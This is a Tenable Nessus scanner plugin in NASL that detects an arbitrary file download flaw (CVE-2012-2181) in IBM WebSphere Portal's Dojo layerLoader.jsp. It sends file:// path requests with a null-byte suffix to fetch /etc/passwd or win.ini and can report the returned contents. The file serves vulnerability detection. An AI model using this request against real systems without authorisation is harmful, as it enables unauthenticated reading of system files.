#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61488);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2013/05/30 01:44:48 $");

  script_cve_id("CVE-2012-2181");
  script_bugtraq_id(54349);
  script_osvdb_id(83629);

  script_name(english:"IBM WebSphere Portal Dojo Module URI Traversal Arbitrary File Access");
  script_summary(english:"Tries to download a file outside the webroot");

  script_set_attribute(
    attribute:"synopsis",
    value:
"An application hosted on the remote web server has an arbitrary file
download vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of WebSphere Portal on the remote host is using a
vulnerable version of the Dojo toolkit.  Input to the 'path' parameter
of layerLoader.jsp is not properly validated.  A remote,
unauthenticated attacker could exploit this to download arbitrary
files."
  );
  # https://www-304.ibm.com/connections/blogs/PSIRT/entry/security_update_url_manipulation_vulnerability_in_ibm_websphere_portal_versions?lang=en_us
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b229aef1");
  script_set_attribute(attribute:"see_also", value:"http://www-01.ibm.com/support/docview.wss?uid=swg21598363");
  script_set_attribute(
    attribute:"solution",
    value:
"IBM has published APAR PM64172 to fix this vulnerability.  This is
included in WebSphere Portal 7.0.0.1 Cumulative Fix 19 / 7.0.0.2
Cumulative Fix 19 / 8.0 Cumulative Fix 3 and higher.  Refer to IBM's
advisory for more information."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/06/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:websphere_portal");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 10039);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:10039);

requests = make_array();
if (report_paranoia < 2 && os = get_kb_item('Host/OS'))
{
  if ('Windows' >< os)
  {
    requests['/windows/win.ini'] = '(; for 16-bit app support|\\[MCI Extensions.BAK\\])';
    requests['/winnt/win.ini'] = '(; for 16-bit app support|\\[MCI Extensions.BAK\\])';
  }
  else
    requests['/etc/passwd'] = 'root:.*:0:[01]:';
}
else
{
  requests['/windows/win.ini'] = '(; for 16-bit app support|\\[MCI Extensions.BAK\\])';
  requests['/winnt/win.ini'] = '(; for 16-bit app support|\\[MCI Extensions.BAK\\])';
  requests['/etc/passwd'] = 'root:.*:0:[01]:';
}

# the first dir was the default dir in version 8, i've seen the latter dir
# show up in online documentation for using dojo w/portal
dirs = make_list('/wps/portal_dojo', '/portal_dojo');
file_not_found = FALSE;  # the software appears vulnerable, but the file requested does not exist
vuln = FALSE;
poc_url = NULL;

foreach file (keys(requests))
{
  pattern = requests[file];

  foreach dir (dirs)
  {
    url = dir + '/layerLoader.jsp?path=file://' + file + '%00';

    # avoid making unnecessary requests. if a previous PoC attempt demonstrated
    # the software is vulnerable but wasn't successful in downloading a file,
    # only continue making requests to the same directory
    if (poc_url && poc_url !~ '^' + dir) continue;

    res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE, fetch404:TRUE);

    if (res[2] =~ pattern)
    {
      vuln = TRUE;
      file_not_found = FALSE;
      poc_url = url;
      break;
    }
    else if ('Problem accessing the absolute URL &quot;file://' + file >< res[2])
    {
      file_not_found = TRUE;
      poc_url = url;
    }
  }

  if (vuln)
    break;
}

if (isnull(poc_url))
  audit(AUDIT_LISTEN_NOT_VULN, 'web server', port);

if (report_verbosity > 0)
{
  if (file_not_found)
  {
    trailer =
      'The file Nessus attempted to download does not exist on the system,\n' +
      'but the vulnerability was still detected due to the resulting error message.';
  }
  else
  {
    header = 'Nessus downloaded ' + file + ' by requesting';

    if (report_verbosity > 1)
      trailer = 'Which returned the following file contents :\n\n' + chomp(res[2]);
  }

  report = get_vuln_report(items:poc_url, port:port, header:header, trailer:trailer);
  security_hole(port:port, extra:report);
}
else security_hole(port);
